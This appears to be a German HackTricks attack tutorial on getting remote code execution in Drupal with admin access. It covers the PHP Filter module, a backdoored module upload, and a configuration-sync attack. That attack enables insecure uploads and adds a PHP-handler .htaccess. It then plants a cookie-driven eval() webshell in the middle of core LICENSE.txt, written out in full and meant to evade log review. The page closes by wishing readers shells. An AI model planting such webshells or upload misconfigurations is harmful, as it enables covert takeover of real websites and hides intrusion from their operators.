# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Mit dem PHP-Filtermodul

> [!WARNING]
> In älteren Versionen von Drupal **(vor Version 8)** war es möglich, sich als Admin anzumelden und **das `PHP-Filter`-Modul zu aktivieren**, das "Eingebetteten PHP-Code/Snippets die Auswertung ermöglicht." Ab Version 8 ist dieses Modul jedoch nicht standardmäßig installiert.

1. Gehe zu **/modules/php** und wenn ein 403-Fehler zurückgegeben wird, dann ist das **PHP-Filter-Plugin installiert und du kannst fortfahren**
1. Wenn nicht, gehe zu `Modules` und aktiviere das Kästchen von `PHP Filter` und klicke dann auf `Save configuration`
2. Um es auszunutzen, klicke auf `Add content`, wähle dann `Basic Page` oder `Article` und schreibe die **PHP-Hintertür**, wähle dann `PHP`-Code im Textformat und schließlich `Preview`
3. Um es auszulösen, greife einfach auf den neu erstellten Knoten zu:
```bash
curl http://drupal.local/node/3
```
## PHP-Filter-Modul installieren

> [!WARNING]
> In aktuellen Versionen ist es nicht mehr möglich, Plugins nur mit Zugriff auf das Web nach der Standardinstallation zu installieren.

Ab Version **8 ist das** [**PHP-Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **Modul nicht standardmäßig installiert**. Um diese Funktionalität zu nutzen, müssten wir **das Modul selbst installieren**.

1. Laden Sie die aktuellste Version des Moduls von der Drupal-Website herunter.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Gehen Sie nach dem Herunterladen zu **`Verwaltung`** > **`Berichte`** > **`Verfügbare Updates`**.
3. Klicken Sie auf **`Durchsuchen`**, wählen Sie die Datei aus dem Verzeichnis aus, in das wir sie heruntergeladen haben, und klicken Sie dann auf **`Installieren`**.
4. Sobald das Modul installiert ist, können wir auf **`Inhalt`** klicken und **eine neue einfache Seite erstellen**, ähnlich wie wir es im Drupal 7-Beispiel gemacht haben. Achten Sie erneut darauf, **`PHP-Code` aus dem Dropdown-Menü `Textformat` auszuwählen**.

## Hintertür-Modul

> [!WARNING]
> In aktuellen Versionen ist es nicht mehr möglich, Plugins nur mit Zugriff auf das Web nach der Standardinstallation zu installieren.

Es war möglich, ein **Modul herunterzuladen**, eine **Hintertür** hinzuzufügen und es **zu installieren**. Zum Beispiel, das [**Trurnstile**](https://www.drupal.org/project/turnstile) Modul im komprimierten Format herunterzuladen, eine neue PHP-Hintertürdatei darin zu erstellen, die den Zugriff auf die PHP-Datei mit einer `.htaccess`-Datei ermöglicht:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
Und dann gehen wir zu **`http://drupal.local/admin/modules/install`**, um das mit einem Backdoor versehene Modul zu installieren und auf **`/modules/turnstile/back.php`** zuzugreifen, um es auszuführen.

## Backdooring Drupal mit Konfigurationssynchronisation <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Beitrag geteilt von** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Teil 1 (Aktivierung von _Media_ und _Media Library_)

Im _Erweitern_-Menü (/admin/modules) können Sie aktivieren, was wie bereits installierte Plugins aussieht. Standardmäßig scheinen die Plugins _Media_ und _Media Library_ nicht aktiviert zu sein, also lassen Sie uns diese aktivieren.

Vor der Aktivierung:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nach der Aktivierung:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Teil 2 (Nutzung der Funktion _Konfigurationssynchronisation_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Wir werden die Funktion _Konfigurationssynchronisation_ nutzen, um Drupal-Konfigurationseinträge zu dumpen (exportieren) und hochzuladen (importieren):

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch system.file.yml**

Lassen Sie uns mit dem Patchen des ersten Eintrags `allow_insecure_uploads` beginnen:

Datei: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Zu:

Datei: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field_media_document.yml**

Dann patchen Sie den zweiten Eintrag `file_extensions` von: 

Datei: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Zu:

Datei: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Ich verwende es in diesem Blogbeitrag nicht, aber es wird angemerkt, dass es möglich ist, den Eintrag `file_directory` beliebig zu definieren und dass er anfällig für einen Path Traversal-Angriff ist (so können wir im Drupal-Dateisystembaum nach oben navigieren).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Teil 3 (Nutzung der Funktion _Dokument hinzufügen_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Der letzte Schritt ist der einfachste und wird in zwei Unter Schritte unterteilt. Der erste besteht darin, eine Datei im .htaccess-Format hochzuladen, um die Apache-Direktiven zu nutzen und .txt-Dateien vom PHP-Engine interpretieren zu lassen. Der zweite besteht darin, eine .txt-Datei hochzuladen, die unser Payload enthält.

Datei: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Warum ist dieser Trick cool?

Weil, sobald die Webshell (die wir LICENSE.txt nennen) auf dem Webserver abgelegt ist, können wir unsere Befehle über `$_COOKIE` übertragen und in den Webserver-Protokollen wird dies als legitime GET-Anfrage an eine Textdatei angezeigt.

Warum nennen wir unsere Webshell LICENSE.txt?

Einfach, weil wir die folgende Datei nehmen, zum Beispiel [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (die bereits im Drupal-Kern vorhanden ist), haben wir eine Datei mit 339 Zeilen und 17,6 KB Größe, die perfekt ist, um einen kleinen PHP-Code-Schnipsel in der Mitte hinzuzufügen (da die Datei groß genug ist).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Datei: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Teil 3.1 (Datei .htaccess hochladen)**

Zuerst nutzen wir die _Add Document_ (/media/add/document) Funktion, um unsere Datei mit den Apache-Direktiven (.htaccess) hochzuladen.

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Teil 3.2 (Datei LICENSE.txt hochladen)**

Dann nutzen wir erneut die _Add Document_ (/media/add/document) Funktion, um eine Webshell, die in einer Lizenzdatei versteckt ist, hochzuladen.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Teil 4 (Interaktion mit der Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Der letzte Teil besteht darin, mit der Webshell zu interagieren.

Wie im folgenden Screenshot gezeigt, erhalten wir das nachfolgende Ergebnis, wenn das von unserer Webshell erwartete Cookie nicht definiert ist, während wir die Datei über einen Webbrowser aufrufen.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Wenn der Angreifer das Cookie setzt, kann er mit der Webshell interagieren und beliebige Befehle ausführen.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Und wie Sie in den Protokollen sehen können, scheint nur eine txt-Datei angefordert worden zu sein.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Vielen Dank, dass Sie sich die Zeit genommen haben, diesen Artikel zu lesen. Ich hoffe, er hilft Ihnen, einige Shells zu erhalten.

{{#include ../../../banners/hacktricks-training.md}}
